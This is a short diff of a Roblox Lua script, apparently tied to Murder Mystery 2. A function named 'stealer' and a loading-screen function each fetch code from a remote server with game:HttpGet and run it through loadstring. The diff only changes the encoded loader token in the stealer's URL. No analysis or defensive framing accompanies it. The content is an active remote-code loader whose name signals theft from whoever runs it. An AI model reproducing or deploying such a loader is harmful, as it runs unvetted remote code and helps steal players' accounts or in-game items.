@@ -1,5 +1,5 @@
 local function stealer()
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImVmZGQ1MjgzLTlhZTEtNDAzNy04ZjYwLTFmY2ZhZGM5ZWE1MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImVmZGQ1MjgzLTlhZTEtNDAzNy04ZjYwLTFmY2ZhZGM5ZWE1MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmUifX0"))()
 end
 local function loadingscreen()
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImVmZGQ1MjgzLTlhZTEtNDAzNy04ZjYwLTFmY2ZhZGM5ZWE1MiIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6Im1tMm92ZXJkcml2ZW9yaWdpbmFsIn19"))()
